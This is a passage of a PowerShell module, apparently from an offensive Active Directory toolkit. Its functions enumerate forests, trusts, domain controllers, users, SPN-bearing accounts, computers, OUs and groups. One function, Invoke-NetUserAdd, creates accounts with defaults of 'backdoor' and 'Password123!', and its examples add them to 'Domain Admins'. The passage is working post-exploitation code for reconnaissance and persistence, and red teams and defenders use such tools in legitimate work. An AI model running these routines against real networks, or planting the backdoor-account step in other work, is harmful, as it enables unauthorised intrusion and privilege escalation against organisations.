            Write-Warning "The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else{
        # otherwise use the current forest
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
}


function Get-NetForestDomains {
    <#
        .SYNOPSIS
        Return all domains for the current forest.

        .DESCRIPTION
        This function returns all domains for the current forest
        the current domain is a part of.

        .PARAMETER Forest
        Return domains for the specified forest.

        .PARAMETER Domain
        Return doamins that match this term/wildcard.

        .EXAMPLE
        > Get-NetForestDomains 
        Return domains apart of the current forest.
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Domain,

        [string]
        $Forest
    )
    
    if($Domain){
        # try to detect a wild card so we use -like
        if($Domain.Contains('*')){
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
        }
        else{
            # match the exact domain name if there's not a wildcard
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
        }
    }
    else{
        # return all domains
        (Get-NetForest -Forest $Forest).Domains
    }
}


function Get-NetForestTrusts {
    <#
        .SYNOPSIS
        Return all trusts for the current forest.
        
        .DESCRIPTION
        This function returns all current trusts associated
        the forest the current domain is a part of.

        .PARAMETER Forest
        Return trusts for the specified forest.

        .EXAMPLE
        > Get-NetForestTrusts
        Return current forest trusts.

        .EXAMPLE
        > Get-NetForestTrusts -Forest "test"
        Return trusts for the "test" forest.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Forest
    )

    $f = (Get-NetForest -Forest $Forest)
    if($f){
        $f.GetAllTrustRelationships()
    }
}


function Get-NetDomainControllers {
    <#
        .SYNOPSIS
        Return the current domain controllers for the active domain.
        
        .DESCRIPTION
        Uses DirectoryServices.ActiveDirectory to return the current domain 
        controllers.

        .PARAMETER Domain
        The domain whose domain controller to enumerate.
        If not given, gets the current computer's domain controller.

        .OUTPUTS
        System.Array. An array of found domain controllers.

        .EXAMPLE
        > Get-NetDomainControllers
        Returns the domain controllers for the current computer's domain.  
        Approximately equivialent to the hostname given in the LOGONSERVER 
        environment variable.

        .EXAMPLE
        > Get-NetDomainControllers -Domain test
        Returns the domain controllers for the domain "test".
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Domain
    )
    
    # if a domain is specified, try to grab that domain
    if ($Domain){
        
        try{
            # try to create the context for the target domain
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext).DomainControllers
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            $null
        }
    }
    else{
        # otherwise, grab the current domain
        [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-NetCurrentUser {
    <#
        .SYNOPSIS
        Gets the name of the current user.
        
        .DESCRIPTION
        This function returns the username of the current user context,
        with the domain appended if appropriate.
        
        .OUTPUTS
        System.String. The current username.
        
        .EXAMPLE
        > Get-NetCurrentUser
        Return the current user.
    #>
    
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}


function Get-NetUsers {
    <#
        .SYNOPSIS
        Gets a list of all current users in a domain.
        
        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current 
        domain for all users. Another domain can be specified to
        query for users across a trust.
        This is a replacement for "net users /domain"

        .PARAMETER UserName
        Username filter string, wildcards accepted.

        .PARAMETER Domain
        The domain to query for users. If not supplied, the 
        current domain is used.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER LDAPquery
        The complete LDAP query string to use to query for users.

        .OUTPUTS
        Collection objects with the properties of each user found.

        .EXAMPLE
        > Get-NetUsers
        Returns the member users of the current domain.

        .EXAMPLE
        > Get-NetUsers -Domain testing
        Returns all the members in the "testing" domain.
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $UserName,

        [string]
        $OU,

        [string]
        $LDAPquery,

        [string]
        $Domain
    )
    

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we have an OU specified, be sure to through it in
            if($OU){
                $dn = "OU=$OU,$dn"
            }

            # use the specified LDAP query string to query for users
            if($LDAPquery){
                "LDAP: $LDAPquery"
                $dn = $LDAPquery
            }

            # if we could grab the primary DC for the current domain, use that for the query
            if ($PrimaryDC){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }
            
            # check if we're using a username filter or not
            if($UserName){
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName))"
            }
            else{
                $UserSearcher.filter='(&(samAccountType=805306368))'
            }
            $UserSearcher.PageSize = 200
            $UserSearcher.FindAll() |ForEach-Object {$_.properties}
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        if($UserName){
            $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
        }
        # if we're specifying an OU
        elseif($OU){
            $dn = "OU=$OU," + ([adsi]'').distinguishedname
            $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            $UserSearcher.filter='(&(samAccountType=805306368))'
        }
        # if we're specifying a specific LDAP query string
        elseif($LDAPquery){
            $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$LDAPquery")
            $UserSearcher.filter='(&(samAccountType=805306368))'
        }
        else{
            $UserSearcher = [adsisearcher]'(&(samAccountType=805306368))'
        }
        $UserSearcher.PageSize = 1000
        $UserSearcher.FindAll() | ForEach-Object {$_.properties}
    }
}


function Get-NetUser {
    <#
        .SYNOPSIS
        Returns data for a specified domain user.
        
        .DESCRIPTION
        This function utilizes [ADSI] and LDAP to query the current domain
        for the data for a specific user. Another domain can be specified to
        query for user information across a trust.

        .PARAMETER UserName
        The domain username to query for. If not given, it defaults to "Administrator"

        .PARAMETER Domain
        The domain to query for for the user.

        .OUTPUTS
        Collection object with the properties of the user found, or $null if the
        user isn't found.

        .EXAMPLE
        > Get-NetUser
        Returns data for the "Administrator" user for the current domain.

        .EXAMPLE
        > Get-NetUser -UserName "jsmith"
        Returns data for user "jsmith" in the current domain.  

        .EXAMPLE
        > Get-NetUser -UserName "jsmith" -Domain testing
        Returns data for user "jsmith" in the 'testing' domain.  
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $UserName = 'administrator',

        [string]
        $Domain
    )
    

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn") 
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }

            $UserSearcher.filter="(&(samaccountname=$UserName))"
            
            $user = $UserSearcher.FindOne()
            if ($user){
                $user.properties
            }
            else{
                Write-Warning "Username $UserName not found in domain $Domain"
                $null
            }
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        $UserSearcher = [adsisearcher]"(&(samaccountname=$UserName))"
        $user = $UserSearcher.FindOne()
        if ($user){
            $user.properties
        }
        else{
            Write-Warning "Username $UserName not found in the current domain."
            $null
        }
    }
}

function Get-NetUserByFilter {
    <#
        .SYNOPSIS
        Returns data for a specified domain user based on their real name.
        
        .DESCRIPTION
        This function utilizes [ADSI] and LDAP to query the current domain
        for data on one or more domain users. The query domain may be
        specified to query for user information across a trust.

        .PARAMETER Filter
        A string containing formatted filters to be passed to the DirectorySearcher object, in (&(key=value)(...)) format.

        .PARAMETER Domain
        The domain to query for the user.

        .OUTPUTS
        Collection object with the properties of the user account(s) found, or $null if the search yields no matching results.

        .EXAMPLE
        > Get-NetUserByFilter
        Returns data for the "Administrator" user for the current domain.

        .EXAMPLE
        > Get-NetUserByFilter -Filter "(&(givenname=John)(sn=Smith))"
        Returns data for user accounts with givenname and sn paramater values "John" and "Smith" in the current domain.  

        .EXAMPLE
        > Get-NetUserByFilter -Filter "(&(givenname=John)(sn=Smith))" -Domain "testing"
        Returns data for user accounts with givenname and sn paramater values "John" and "Smith" in the 'testing' domain. 
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Filter = "(&(samaccountname=Administrator))",

        [string]
        $Domain
    )
    

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn") 
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }

            $UserSearcher.filter=$Filter
            
            $userSet = $UserSearcher.FindAll()
            if ($userSet){
                ($userSet | ForEach-Object {$_.properties})
            }
            else{
                Write-Warning "No user account data found in domain $Domain based on provided filter(s)."
                $null
            }
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        $UserSearcher = [adsisearcher]$Filter
        $userSet = $UserSearcher.FindAll()
        if ($userSet){
            ($userSet | ForEach-Object {$_.properties})
        }
        else{
            Write-Warning "No user account data found in domain $Domain based on provided filter(s)."
            $null
        }
    }
}

function Get-NetUserSPNs {
    <#
        .SYNOPSIS
        Gets all users in the domain with non-null 
        service principal names.
        
        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current 
        domain for all users and find users with non-null
        service principal names (SPNs). Another domain can be 
        specified to query for users across a trust.

        .PARAMETER UserName
        Username filter string, wildcards accepted.

        .PARAMETER Domain
        The domain to query for users. If not supplied, the 
        current domain is used.

        .OUTPUTS
        samaccount name and SPNs for specified users

        .EXAMPLE
        > Get-NetUserSPNs
        Returns the member users of the current domain with
        non-null SPNs.

        .EXAMPLE
        > Get-NetUserSPNs -Domain testing
        Returns all the members in the "testing" domain with
        non-null SPNs.
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $UserName,

        [string]
        $Domain
    )
    

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if ($PrimaryDC){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            
            # check if we're using a username filter or not
            if($UserName){
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName))"
            }
            else{
                $UserSearcher.filter='(&(samAccountType=805306368))'
            } 
            $UserSearcher.FindAll() | ForEach-Object {
                if ($_.properties['ServicePrincipalName'].count -gt 0){
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'SamAccountName' $_.properties.samaccountname
                    $out | Add-Member Noteproperty 'ServicePrincipalName' $_.properties['ServicePrincipalName']
                    $out
                }   
            }
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        if($UserName){
            $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
        }
        else{
            $UserSearcher = [adsisearcher]'(&(samAccountType=805306368))'
        }
        $UserSearcher.FindAll() | ForEach-Object {
            if ($_.properties['ServicePrincipalName'].count -gt 0){
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'samaccountname' $_.properties.samaccountname
                $out | Add-Member Noteproperty 'ServicePrincipalName' $_.properties['ServicePrincipalName']
                $out
            }   
        }
    }
}


function Invoke-NetUserAdd {
    <#
        .SYNOPSIS
        Adds a local or domain user.
        
        .DESCRIPTION
        This function utilizes DirectoryServices.AccountManagement to add a
        user to the local machine or a domain (if permissions allow). It will
        default to adding to the local machine. An optional group name to
        add the user to can be specified.

        .PARAMETER UserName
        The username to add. If not given, it defaults to "backdoor"

        .PARAMETER Password
        The password to set for the added user. If not given, it defaults to "Password123!"

        .PARAMETER GroupName
        Group to optionally add the user to.

        .PARAMETER HostName
        Host to add the local user to, defaults to 'localhost'

        .PARAMETER Domain
        Specified domain to add the user to.
            
        .OUTPUTS
        System.bool. True if the add succeeded, false otherwise.

        .EXAMPLE
        > Invoke-NetUserAdd -UserName john -Password password
        Adds a localuser "john" to the machine with password "password"

        .EXAMPLE
        > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain ''
        Adds the user "john" with password "password" to the current domain and adds
        the user to the domain group "Domain Admins" 

        .EXAMPLE
        > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain 'testing'
        Adds the user "john" with password "password" to the 'testing' domain and adds
        the user to the domain group "Domain Admins" 

        .Link
        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
    #>
    
    [CmdletBinding()]
    Param (
        [string]
        $UserName = 'backdoor',

        [string]
        $Password = 'Password123!',

        [string]
        $GroupName,

        [string]
        $HostName = 'localhost',

        [string]
        $Domain
    )
    
    if ($Domain){
        
        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        
        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
        
        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        
        try{
            # try to create the context for the target domain
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            return $null
        }
        
        # get the domain context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d
        
        # create the user object
        $usr = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $context
        
        # set user properties
        $usr.name = $UserName
        $usr.SamAccountName = $UserName
        $usr.PasswordNotRequired = $false
        $usr.SetPassword($password)
        $usr.Enabled = $true
        
        try{
            # commit the user
            $usr.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else{
        $objOu = [ADSI]"WinNT://$HostName"
        $objUser = $objOU.Create('User', $UserName)
        $objUser.SetPassword($Password)
        
        # commit the changes to the local machine
        try{ 
            $b = $objUser.SetInfo()
            "[*] User $UserName successfully created on host $HostName"
        }
        catch{
            # TODO: error handling if permissions incorrect
            Write-Warning '[!] Account already exists!'
            return
        }
    }
    
    # if a group is specified, invoke Invoke-NetGroupUserAdd and return its value
    if ($GroupName){
        # if we're adding the user to a domain
        if ($Domain){
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }
        # otherwise, we're adding to a local group
        else{
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -HostName $HostName
            "[*] User $UserName successfully added to group $GroupName on host $HostName"
        }
    }
    
}


function Get-NetComputers {
    <#
        .SYNOPSIS
        Gets an array of all current computers objects in a domain.
        
        .DESCRIPTION
        This function utilizes adsisearcher to query the current AD context 
        for current computer objects. Based off of Carlos Perez's Audit.psm1 
        script in Posh-SecMod (link below).
        
        .PARAMETER HostName
        Return computers with a specific name, wildcards accepted.

        .PARAMETER SPN
        Return computers with a specific service principal name, wildcards accepted.

        .PARAMETER OperatingSystem
        Return computers with a specific operating system, wildcards accepted.

        .PARAMETER ServicePack
        Return computers with a specific service pack, wildcards accepted.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER FullData
        Return full user computer objects instead of just system names (the default).

        .PARAMETER Domain
        The domain to query for computers.

        .OUTPUTS
        System.Array. An array of found system objects.

        .EXAMPLE
        > Get-NetComputers
        Returns the current computers in current domain.

        .EXAMPLE
        > Get-NetComputers -SPN mssql*
        Returns all MS SQL servers on the domain.

        .EXAMPLE
        > Get-NetComputers -Domain testing
        Returns the current computers in 'testing' domain.

        > Get-NetComputers -Domain testing -FullData
        Returns full computer objects in the 'testing' domain.

        .LINK
        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
    #>
    
    [CmdletBinding()]
    Param (
        [string]
        $HostName = '*',

        [string]
        $SPN = '*',

        [string]
        $OperatingSystem = '*',

        [string]
        $ServicePack = '*',

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [string]
        $Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn") 
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }

            # create the searcher object with our specific filters
            if ($ServicePack -ne '*'){
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)(servicePrincipalName=$SPN))"
            }
            else{
                # server 2012 peculiarity- remove any mention to service pack
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(servicePrincipalName=$SPN))"
            }
            
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        if ($ServicePack -ne '*'){
            $CompSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)(servicePrincipalName=$SPN))"
        }
        else{
            # server 2012 peculiarity- remove any mention to service pack
            $CompSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(servicePrincipalName=$SPN))"
        }
    }
    
    if ($CompSearcher){
        
        # eliminate that pesky 1000 system limit
        $CompSearcher.PageSize = 200
        
        $CompSearcher.FindAll() | ForEach-Object {
            $up = $true
            if($Ping){
                $up = Test-Server -Server $_.properties.dnshostname
            }
            if($up){
                # return full data objects
                if ($FullData){
                    $_.properties
                }
                else{
                    # otherwise we're just returning the DNS host name
                    $_.properties.dnshostname
                }
            }
        }
    }
}


function Get-NetOUs {
    <#
        .SYNOPSIS
        Gets a list of all current OUs in a domain.
        
        .DESCRIPTION
        This function utilizes adsisearcher to query the local domain,
        or a trusted domain, for all OUs present.
        
        .PARAMETER GroupName
        The group name to query for, wildcards accepted.

        .PARAMETER Domain
        The domain to query for OUs.

        .PARAMETER FullData
        Return full OU objects instead of just object names (the default).

        .OUTPUTS
        System.Array. An array of found OUs.

        .EXAMPLE
        > Get-NetOUs
        Returns the current OUs in the domain.

        .EXAMPLE
        > Get-NetOUs -OUName *admin*
        Returns all OUs with "admin" in their name.

        .EXAMPLE
        > Get-NetOUs -Domain testing
        Returns all OUs in the 'testing' domain
    #>

    [CmdletBinding()]
    Param (
        [string]
        $OUName = '*',

        [Switch]
        $FullData,

        [string]
        $Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $OUSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn") 
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $OUSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }

            $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"
            
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $OUSearcher = [adsisearcher]"(&(objectCategory=organizationalUnit)(name=$OUName))"
    }
    
    if ($OUSearcher){
        
        # eliminate that pesky 1000 system limit
        $OUSearcher.PageSize = 200
        
        $OUSearcher.FindAll() | ForEach-Object {
            # if we're returning full data objects
            if ($FullData){
                $_.properties
            }
            else{
                # otherwise we're just returning the ADS path
                $_.properties.adspath
            }
        }
    }

}


function Get-NetGroups {
    <#
        .SYNOPSIS
        Gets a list of all current groups in a domain.
        
        .DESCRIPTION
        This function utilizes adsisearcher to query the local domain,
        or a trusted domain, for all groups present.
        
        .PARAMETER GroupName
        The group name to query for, wildcards accepted.

        .PARAMETER Domain
        The domain to query for groups.

        .PARAMETER FullData
        Return full group objects instead of just object names (the default).

        .OUTPUTS
        System.Array. An array of found groups.

        .EXAMPLE
        > Get-NetGroups
        Returns the current groups in the domain.

        .EXAMPLE
        > Get-NetGroups -GroupName *admin*
        Returns all groups with "admin" in their group name.

        .EXAMPLE
        > Get-NetGroups -Domain testing
        Returns all groups in the 'testing' domain

        .EXAMPLE
        > Get-NetGroups -Domain testing -FullData
        Returns full group data objects in the 'testing' domain
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $GroupName = '*',

        [string]
        $Domain,

        [switch]
        $FullData
    )
    
    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }

            $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
            # eliminate that pesky 1000 system limit
            $GroupSearcher.PageSize = 200
        
            $GroupSearcher.FindAll() | ForEach-Object {
                # if we're returning full data objects
                if ($FullData){
                    $_.properties
                }
                else{
                    # otherwise we're just returning the group name
                    $_.properties.samaccountname
                }
            }
        }
        catch{
            Write-Warning "[!] The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        $GroupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
        $GroupSearcher.PageSize = 200
        
        try {
            $GroupSearcher.FindAll() | ForEach-Object {
                # if we're returning full data objects
                if ($FullData){
                    $_.properties
                }
                else{
                    # otherwise we're just returning the group name
                    $_.properties.samaccountname
                }
            }
        }
        catch{
            Write-Warning '[!] Can not contact domain.'
        }
    }
}


function Get-NetGroup {
    <#
        .SYNOPSIS
        Gets a list of all current users in a specified domain group.
        
        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current AD context 
        or trusted domain for users in a specified group. If no GroupName is 
        specified, it defaults to querying the "Domain Admins" group. 
        This is a replacement for "net group 'name' /domain"

        .PARAMETER GroupName
        The group name to query for users. If not given, it defaults to "Domain Admins"
        
        .PARAMETER Domain
        The domain to query for group users.
        
        .OUTPUTS
        System.Array. An array of found users for the specified group.

        .EXAMPLE
        > Get-NetGroup
        Returns the usernames that of members of the "Domain Admins" domain group.
        
        .EXAMPLE
        > Get-NetGroup -GroupName "Power Users"
        Returns the usernames that of members of the "Power Users" domain group.

        .EXAMPLE
        > Get-NetGroup -Domain testing
        Returns the usernames that of members of the "Domain Admins" group
        in the 'testing' domain.

        .LINK
        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $GroupName = 'Domain Admins',

        [Switch]
        $FullData,

        [string]
        $Domain
    )
    
    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }
            # samAccountType=805306368 indicates user objects 
            $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        $GroupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
    }
    
    if ($GroupSearcher){
        # return full data objects
        if ($FullData) {
            if($PrimaryDC){
                $GroupSearcher.FindOne().properties['member'] | ForEach-Object {
                    # for each user/member, do a quick adsi object grab
                    ([adsi]"LDAP://$PrimaryDC/$_").Properties
                }
            }
            else{
                $GroupSearcher.FindOne().properties['member'] | ForEach-Object {
                    # for each user/member, do a quick adsi object grab
                    ([adsi]"LDAP://$_").Properties
                }
            }
        }
        else{
            if($PrimaryDC){
                $GroupSearcher.FindOne().properties['member'] | ForEach-Object {
                    ([adsi]"LDAP://$PrimaryDC/$_").SamAccountName
                }
            }
            else{
                $GroupSearcher.FindOne().properties['member'] | ForEach-Object {
                    ([adsi]"LDAP://$_").SamAccountName
                }
            }
        }
    }
}


function Get-NetLocalGroups {
    <#
        .SYNOPSIS
        Gets a list of all localgroups on a remote machine.
        
        .DESCRIPTION
        This function utilizes ADSI to query a remote (or local) host for
        all localgroups on a specified remote machine.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.
            
        .OUTPUTS
        Object[] array of found local groups objets.

        .EXAMPLE
        > Get-NetLocalGroups
        Returns all local groups, equivalent to "net localgroup"
        
        .EXAMPLE
        > Get-NetLocalGroups -HostName WINDOWSXP
        Returns all the local groups for WINDOWSXP

        .LINK
        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $HostList
    )
    
    $Servers = @()
    
    # if we have a host list passed, grab it
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else{
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $null
        }
    }
    else{
        # otherwise assume a single host name
        $Servers = $($HostName)
    }
    
    foreach($Server in $Servers)
    {
        try{
            $computer = [ADSI]"WinNT://$server,computer"
            
            $computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'Server' $Server
                $out | Add-Member Noteproperty 'Group' (($_.name)[0])
                $out | Add-Member Noteproperty 'SID' ((new-object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                $out
            }
        }
        catch{
            Write-Warning "[!] Error: $_"
        }
    }
}


function Get-NetLocalGroup {
    <#
        .SYNOPSIS
        Gets a list of all current users in a specified local group.
        
        .DESCRIPTION
        This function utilizes ADSI and WinNT to query a remote (or local) host for
        all members of a specified localgroup.
